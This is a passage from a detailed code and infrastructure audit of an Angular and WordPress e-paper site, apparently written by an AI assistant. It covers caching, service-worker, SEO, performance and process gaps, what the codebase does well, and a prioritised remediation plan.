- **No `swUpdate.unrecoverableState` handler** — a client whose cache references a purged hash gets a broken app with no self-heal. One subscription → `location.reload()`.
- **`EditionCacheService:464-467` writes one localStorage key per date with no TTL and no LRU eviction.** `evict()` only runs on explicit admin save or same-day invalidation. A daily reader accumulates a key per day forever until the 5-10 MB quota silently fills — after which *all* localStorage writes, including the auth-token path at `auth.service.ts:75`, start throwing into empty catches. Add a byte/key cap with oldest-first eviction.
- **The lazy-loading win is undone by the service worker.** `ngsw-config.json`'s `app-shell` group is `installMode: prefetch` and its `/*.js` glob expands — verified in the generated `ngsw.json` — to include both admin chunks. Every reader's SW background-downloads them anyway (~214 KiB brotli on the wire), on install and on every release. Details and the fix in §7.3.
- `xlsx@0.18.5` carries unpatched prototype-pollution (GHSA-4r6h-8v6p-xvw6) and ReDoS (GHSA-5pgg-2g8v-p4x9) advisories with **no fix on the npm registry** (the maintained line moved to `cdn.sheetjs.com`). Mitigated by being admin-only and lazy, but it parses attacker-supplied files. Either switch to the CDN tarball or drop it — you already have a hand-rolled XML importer.
- No virtual scrolling anywhere. Currently fine (~30 pages/edition, thumbnails already lazy + IntersectionObserver), but it will bite in `/admin` and in the growing date archive.

> `<html lang="en">` on Bengali content, and the rest of the head-tag gaps, are in chapter 6. Fonts, LCP, CLS and INP are in chapter 7.

### 4.11 Zoneless readiness

6 of 8 components are already `OnPush`; signals are used well (`AdSlotComponent` is fully modern — `input.required`, `computed`, signal `viewChild`, `effect`; `SettingsService`/`DateIndexService` are signal-based; `toSignal` bridges exist in `NewspaperDataService`).

Blockers are concrete: `AdminComponent` Default-CD with 65 `detectChanges()` and 0 `markForCheck()`; 13 `detectChanges()` in `NewspaperComponent` from `ResizeObserver`/`IntersectionObserver`/`img.onload` callbacks outside any signal graph; zero `async` pipe usage. **Order:** OnPush on `AdminComponent` first (forces the 65 calls to become `markForCheck()` and exposes every unmarked mutation) → move `data$` consumers onto the existing signals → flip zoneless. Payoff includes dropping the 34 KB zone.js polyfill.

---

## 5. Process

### 5.1 Zero tests, zero lint, zero formatting, no CI gate

```
$ find src -name "*.spec.ts" | wc -l   → 0
$ ls -a | grep -iE "eslint|prettier|husky|karma|jest|vitest|editorconfig"   → (nothing)
$ grep '"test"\|"lint"' package.json   → (nothing)
```

No `karma.conf`, no test target in `angular.json`, no `.eslintrc`, no `.prettierrc`, no `.husky/`, no `.editorconfig`. The only workflow is `deploy.yml` — a deploy pipeline with no build/lint/test gate, whose one implicit gate (the build) has been failing since July (§2.1).

On a codebase with a 4,413-line component and an 8,532-line PHP file, this is the highest-leverage process gap.

**Minimum viable:** `ng add @angular/eslint`, add Prettier + `lint-staged` pre-commit, add `php -l` to CI for the plugin, and start characterization tests on the three pure-logic units that are easy wins — `xml-import.service.ts` (**you already ship 9 XML fixtures in `src/assets/test-fixtures/xml/` that no test consumes**), `page-label.util.ts`, and the `http-cache.interceptor.ts` TTL rules.

### 5.2 Documentation sprawl

36 root-level markdown files, 488 KB, with heavy overlap (4 `PERFORMANCE_*.md`, 3 `DEPLOY*.md`, plus `IMPROVEMENT_AUDIT.md`, `ARCHITECTURE_IMPROVEMENT_PLAN.md`, `TECHNICAL_DOCUMENTATION.md`). Several describe plans that were implemented, abandoned, or superseded, with nothing marking which. Move to `docs/`, add a dated index, delete the superseded ones.

---

## 6. SEO

> Full detail, with exact insertion points and code: **[`SEO_PERFORMANCE.md` §1](./SEO_PERFORMANCE.md)**.

### 6.1 Googlebot sees an empty shell on every URL

The `.htaccess` social-crawler UA list (five identical copies at `:16, 17, 59, 64, 69`) contains `Googlebot-Image` but **not plain `Googlebot`** — nor `bingbot`, `DuckDuckBot`, `YandexBot`, `Applebot`, or any AI crawler. Traced through the rewrite rules in order, a Googlebot request for `/` falls through to `index.csr.html` (the `index.html` preference rule at `:83` is dead — that file doesn't exist in the build). An article URL hits the catch-all at `:108` and gets **byte-for-byte the same file**.

That file, measured at 9,728 B, contains: `<html lang="en">` on Bengali content, a good static `<title>`, **no description, no canonical, no JSON-LD**, an **empty** `dn-initial-state` tag, and an empty `<app-root>`. Zero words of newspaper content. Every one of ~128,000 article URLs returns it with HTTP 200.

Meanwhile `Googlebot-Image` *is* matched, so Google's image crawler receives the `/social` HTML — carrying `X-Robots-Tag: noarchive`, `Cache-Control: no-store`, a `window.location.replace()`, and a body reading "Redirecting to…". Googlebot and Googlebot-Image get materially different documents for the same URL, and **Google Images cannot index your page scans.**

### 6.2 The crawl graph has exactly one node

Verified: **zero `routerLink` in the entire application.** Of 20 `<a>` elements, 12 are external social icons, 6 are `tel:`/`mailto:`/external, 1 is commented out, and 1 — the logo at `newspaper.component.html:107` — points at the homepage.

> *Corrected during verification:* the first pass claimed "no internal `<a href>` at all." Wrong by one element. The conclusion is unchanged.

Every date, page and section navigation is a `(click)` handler (26 of them), the archive is a `<select>` (Google does not enumerate `<option>` elements), and `updateUrl()` uses `location.replaceState()`, which produces no followable link. Combined with `{ path: '**', redirectTo: '' }` and a catch-all that returns 200 for everything:

> **There is no edge from `/` to any other URL. Not to yesterday, not to any page, not to any article.**

### 6.3 Everything else that's missing

No `<meta name="description">` — though the string is already computed at `newspaper.component.ts:1996` and thrown away. No canonical, while **six host aliases** (`epaper`/`nepaper`/`www`, http+https) serve identical content — which also makes the current `og:url` non-canonical. No JSON-LD. No sitemap, despite the plugin already holding the full date index. **No `robots.txt`** — a request for it returns the app shell with `Content-Type: text/html`.

**Order of work:** sitemaps first (the only mechanism that gets ~128k URLs discovered), then the UA-list fix with real server-rendered content in `/social`, then canonical + description + `lang="bn"`, then convert the navigation controls to real `<a href>`. Long term, a build-time prerender fed from the `dn-static/editions/*.json` snapshots — which sidesteps the Imunify360 problem that killed `RenderMode.Prerender` — makes most of the above redundant.

---

## 7. Performance

> Full detail — critical rendering path, round-trip trace, CLS inventory, INP hot spots, `.htaccess` line-by-line: **[`SEO_PERFORMANCE.md` §2–5](./SEO_PERFORMANCE.md)**.

### 7.1 The LCP image is 4–6 round trips deep

On a cold first visit: HTML → fonts+JS → 5 parallel JSON/config requests → (conditional 404 → PHP fallback) → (conditional second batch) → **only then the image**. Best case is round trip 4; realistic first visit is 6. At 150–400 ms RTT the page scan starts downloading 1.2–3.5 s in.

Two structural contributors: `AdService`'s **constructor** fires `/ads/config` — a PHP request on the critical path before any content request; and on a first-ever visit the speculative date resolves to *today*, so an unpublished edition costs an extra 404 → PHP fallback → second `forkJoin`.

Ahead of all of it sit **133,328 B of woff2 at Highest priority** (higher than the module scripts). One of the three files, `latin-ext` (21 KB), covers Latin Extended-A/B and IPA — ranges nothing in this site's content or translations uses.

**Self-inflicted, and cheap to fix:** the decorative blur-up placeholder carries `fetchpriority="high"` while the real image is `[attr.fetchpriority]="mainThumbSrc ? 'auto' : 'high'"`. And because the image renders at `opacity: 0` until load, **it is not an LCP candidate at all** — Chrome measures the blurred placeholder — while a `transition: opacity 0.3s` adds up to 300 ms of pure measurement penalty.

### 7.2 The fix is already written and switched off

Four plugin flags default to `false`: `OPTION_STATIC_SNAPSHOTS`, `OPTION_INLINE_INDEX`, `OPTION_PRELOAD_LCP`, `OPTION_UPLOADS_CACHE` (`digital-newspaper.php:394-397`). Together they collapse the chain from 6 round trips to **2**. This is a checkbox in WP admin.

**Two prerequisites, in this order.** First, `.html` is in neither `compress-dist.js`'s extension set nor the `.htaccess` negotiation alternation, so the shell is never served pre-compressed — turning on `INLINE_INDEX` today would ship an estimated 55–70 KB of uncompressed JSON on every load. Worse, `atomic_write()` only writes `.br`/`.gz` siblings for `.json`, so the plugin's rewritten HTML would be shadowed by the stale `.br` from the last build. Second, defer the synchronous 50 KB `JSON.stringify` + `localStorage.setItem` in `EditionCacheService` — harmless today, but `INLINE_INDEX` moves it into the service constructor, before first paint.

Also fix three bugs in `build_first_page_preload_block()` before relying on it: it high-priorities the thumbnail rather than the image, it emits no `imagesrcset` (fine now, a guaranteed double-download the moment `imageVariants` is populated — see §4.1), and it injects before `</head>`, i.e. *after* the fonts that outrank it.

### 7.3 Network, caching, service worker

- **The SW prefetches the admin bundle for every reader** — `app-shell` is `installMode: prefetch` and its `/*.js` glob pulls in both admin chunks. ~214 KiB brotli, on install and every release. Split the group.
- **No security headers reach the app.** The plugin sets `X-Content-Type-Options`, `X-Frame-Options`, `Referrer-Policy` inside a REST-only callback, and its CSP is hooked to `send_headers`, which never fires for a file Apache serves directly. No HSTS anywhere. The whole security-header story is dead for the actual application — add a `mod_headers` block.
- **Hashed assets may be losing their 1-year cache.** `mod_expires` keys off MIME type, but the served file is `main-….js.br`; whether the type resolves through the unknown extension is host-dependent. Set `Cache-Control: immutable` explicitly.
- Fonts get a 1-year cache but are deliberately *not* content-hashed — re-subsetting them would strand returning visitors for up to a year. Version the path.
- `Vary: Accept-Encoding` is only emitted on the compressed path, leaving the plain response poisonable.

### 7.4 CLS and INP

**CLS.** Structural credit: the app is a fixed-viewport flex layout, which contains most page-level shift, and the main image has real intrinsic dimensions. The unmitigated sources: **ad slots render 0 px until `/ads/config` resolves, then jump to 250 px** (likely the largest single contributor); the left panel renders empty then pops in an entire thumbnail rail; the ~41 px pagination bar inserts above the image; `contain-intrinsic-size: 0 200px` on thumbnails against a real ~290 px; skeletons that don't match the real geometry; FOUT reflow with no metric-matched fallback; and the Heavy-Ad collapse, which *creates* a shift to fix a blank.

**INP.** The ad `MutationObserver` runs **inside the Angular zone** with `{childList: true, subtree: true}` — GPT's SafeFrame construction can trigger 50–200 full app ticks per ad. `renderCurrentEdition()` shallow-clones ~1,000 sections per render, each copying a multi-KB `content` string. The 5-minute version poll re-runs that whole pass under the user's fingers, with no `visibilityState` gate.

Genuinely good and worth not breaking: section overlays are pure CSS absolute positioning with native click handlers — no JS hit-testing — there is no `APP_INITIALIZER`, and the pagination `ResizeObserver` is correctly guarded.

---

## 8. What's already done well

Worth stating plainly — a lot of this is above the norm, and none of it should be "improved":

1. **Multi-tier cache architecture** — memory → localStorage → IndexedDB → static JSON → REST, with per-layer TTL semantics (past dates immutable, today 30 min), ETag/`If-None-Match`, and a 30 s version poll for invalidation. Every layer has a documented rationale and a quota fallback.
2. **Lazy loading is correct**, verified in the built bundles, and `AuthAwarePreloadingStrategy` goes further by gating admin preload on token presence.
3. **`compress-dist.js`** — clean, zero-dependency Brotli-11 + gzip-9 pre-compressor solving a real host constraint, kept in lock-step with the `.htaccess` negotiation rules, idempotent and best-effort per file.
4. **`src/.htaccess`** — pre-compressed negotiation with `-f` guards, correct `Content-Encoding`/`Vary`, SPA shell `no-cache` with a comment explaining the exact blank-page failure it prevents, and WP-path exclusions.
5. **`ngsw-config.json` `navigationUrls` excludes `/wp/**`, `/wp-admin/**`, `/wp-json/**`** — the classic WP+Angular hybrid landmine, correctly defused. The dataGroup tiering is thoughtful.
6. **Social-crawler UA rewrite** to the WordPress `/social` endpoint — a pragmatic, correct answer to "CSR app needs per-article OG cards."
7. **Client-side image rendering** — `<picture>` + AVIF/WebP + `sizes`, `fetchpriority`, `decoding="async"`, intrinsic dimensions, blur-up, retry→placeholder. It just needs a server to feed it (§4.1).
8. **Self-hosted variable font**, three subsets, all preloaded with `crossorigin`, no `fonts.googleapis.com` request.
9. **Immutable store updates** throughout `NewspaperDataService` — no in-place mutation of shared state anywhere.
10. **Real optimistic concurrency** — server `dataVersion`, three distinct 409 conflict types each handled separately client-side, plus resource locks with heartbeat and admin force-release.
11. **Defensive auth beyond the norm** — client-side `exp` pre-check to avoid stale-token flicker, JWT `sub` cross-validated against the stored `userId`, server-side identity re-validation forcing logout on mismatch.
12. **Disaster recovery that actually exists** — every section mirrored to a `dn_section` post with its full payload, and a `rebuild-from-sections` endpoint that can reconstruct the whole dataset including untrashing posts killed by a bad save.
13. **`server.ts`'s SSR fallback design** — 8 s timeout racing a pre-read CSR shell, `settled` flag preventing double-send, `existsSync` fallback so a bad build can't crash startup, `X-SSR-Fallback` header for observability. (Shame it never runs.)
14. **Dependency-free web-vitals RUM** with sampling and beaconing off by default.
15. **Zero TODO/FIXME/HACK and zero commented-out TypeScript** in 27k lines.
16. **Comment quality is exceptional.** The rationale blocks in `app.config.server.ts`, `server.ts`, `wp-api.interceptor.ts`, `edition-cache.service.ts` and the `.htaccess` explain *why*, including abandoned alternatives and the exact failure modes that motivated them. This is rare, it made this review far faster, and it should survive the refactors above.

---

## 9. Suggested sequencing

**Week 1 — stop the bleeding**

1. Gate/sanitize `headScripts`; flip CSP off report-only once verified (§1.1)
2. Rotate the FTP password; strip literals from all 5 tracked files (§2.2)
3. Fix `npm run build -- --flag` → `build:prod` script; point `deploy.js`/CI/`auto-deploy.sh` at it (§2.1)
4. `current_user_can('delete_post', $id)` on media delete; `upload_files` on media upload (§1.2)
5. Rate-limit `/section-crop`; quantise crop coords against the stored section list (§1.4)
6. `manifest.webmanifest`: `display: "standalone"` (§3 Tier 2) — one field, immediate visible win

**Week 1, same effort, immediate user-visible payoff — the "S" tier from `SEO_PERFORMANCE.md` §6**

7. Add `.html` to compression (compress-dist + `.htaccess` + `atomic_write`), then **turn on the four plugin flags** (§7.2) — cold load 6 RT → 2 RT
8. Split the `ngsw-config.json` app-shell group so readers stop prefetching the admin bundle (§7.3)
9. Drop the `latin-ext` font and the `latin` preload; subset Bengali (§7.1)
10. Swap the `fetchpriority` inversion; delete the 300 ms opacity ramp (§7.1)
11. Reserve ad-slot height before `/ads/config` resolves (§7.4) — likely the largest CLS win
12. `<html lang="bn">`, `<meta name="description">`, `robots.txt` (§6.3)
13. Add search crawlers to the prerender UA list; remove `Googlebot-Image` (§6.1)
14. `MutationObserver` → `runOutsideAngular`; stop cloning ~1,000 sections; gate the version poll on `visibilityState` (§7.4)
15. Security headers + explicit `immutable` at the Apache layer (§7.3)

**Week 2 — deploy correctness**

16. Decide SSR: delete it, or prerender `/` from the static snapshot (§2.3) — note this is also SEO item #28 in the companion doc
17. Point deploy at `dist/digital-newspaper/browser`; stop shipping `server/`; use `src/.htaccess` instead of the hardcoded copy
18. Fix rate-limiter IP source (`REMOTE_ADDR` unless behind a configured trusted proxy) (§1.3)
19. `realpath()` containment on `/social-thumb`; validate stored image URLs before `wp_remote_get` (§1.9, §1.7)
20. `wp_kses_post()` on section `content` at the storage boundary; check `normalize-content.pipe.ts` (§1.6)

**Month 1 — quality floor + the big wins**

21. ESLint + Prettier + pre-commit + `php -l` in CI; first specs against the 9 unused XML fixtures (§5.1)
22. **Server-side AVIF/WebP width variants → `imageVariants`** (§4.1) — biggest reader-facing win, zero client changes
23. **Sitemap index + monthly + news endpoints** (§6.3) — the only mechanism that gets ~128k URLs discovered
24. Server-side JSON-LD in `/social`, with the JS redirect dropped for search bots (§6.1)
25. Canonical + alias 301s (§6.3)
26. Delete `src/assets/cropped/`, untrack `dist.bak/` and the 5 zips, scope the assets glob, consolidate 36 docs into `docs/` (§2.4)
27. Cache `isAdmin`/`isAuthenticated`; `track opt.id`; global `ErrorHandler` + error callbacks on the 7 post-mutation reloads (§4.4, §4.5)
28. LRU eviction on edition localStorage keys; `unrecoverableState` handler; bundle budgets (§4.10)

**Quarter — structural**

29. Make prev/next-day, pagination, thumbnails and section overlays real `<a href>` (§6.2)
30. Extract the cropper (~1,180 lines) and `MediaUploadService` (~330 lines) from `AdminComponent`; convert to OnPush with a `_viewDestroyed` guard (§4.2, §4.3)
31. A11y pass: `role="dialog"` + `aria-modal` + accessible name + Escape + focus trap/restore on the 24 admin modals; make the 5 viewer clickable `<div>`s keyboard-reachable (§4.8)
32. Replace the deny-list XML sanitizer with an allow-list (§4.9)
33. Zoneless: `provideZonelessChangeDetection()`, drop the `zone.js` polyfill (§4.11, §7.4)
34. Analytics instrumentation + the missing `/rum` endpoint (§3 Tier 1.4)
35. **Search** — the highest-value missing feature (§3 Tier 1.1)
36. Reader zoom/pan (§3 Tier 2) and PDF export (§3 Tier 1.2)
37. Real build-time prerender fed from `dn-static/editions/*.json` — makes items 13, 24 and 29 largely redundant

---

## Appendix — reviewed but not verifiable

These files were not available in the reviewed snapshot; conclusions touching them are marked in-text:

`shared/pipes/normalize-content.pipe.ts` (affects §1.6 severity — **please check this one**), `components/date-picker/`, `components/loader/`, `components/update-banner/`, `toaster/`, `i18n/translate.pipe.ts`, `i18n/locale-date.pipe.ts`, `services/toaster.service.ts`, `services/loader.service.ts`, `services/image-cache.service.ts`, `directives/action-tracker.directive.ts`, `admin/themes.config.ts`, `main.server.ts`.

(Component `.css`, `src/.htaccess`, `src/styles.css`, `scripts/compress-dist.js` and the real `dist/` build **were** read directly on the dev machine during the SEO/performance pass — chapters 6 and 7 and the companion document are based on measured bytes, not estimates. `section-overlay.component.ts` was also read in that pass.)

**Live-request items.** Nine things need an HTTP request against the running site and could not be checked here (the Chrome extension was not connected and WebFetch could not reach the origin): whether `index.csr.html` is served compressed, whether `mod_expires` resolves types through `.br`, HTTP/2 vs /3, which element Chrome picks as LCP, the published date count, the live values of the four feature flags, the real size of the inline bootstrap blob, whether `home_url()` is `epaper` or `nepaper`, and whether `static.dailysangram.com` is a live CDN. Each is listed with its exact command in [`SEO_PERFORMANCE.md` §7](./SEO_PERFORMANCE.md).
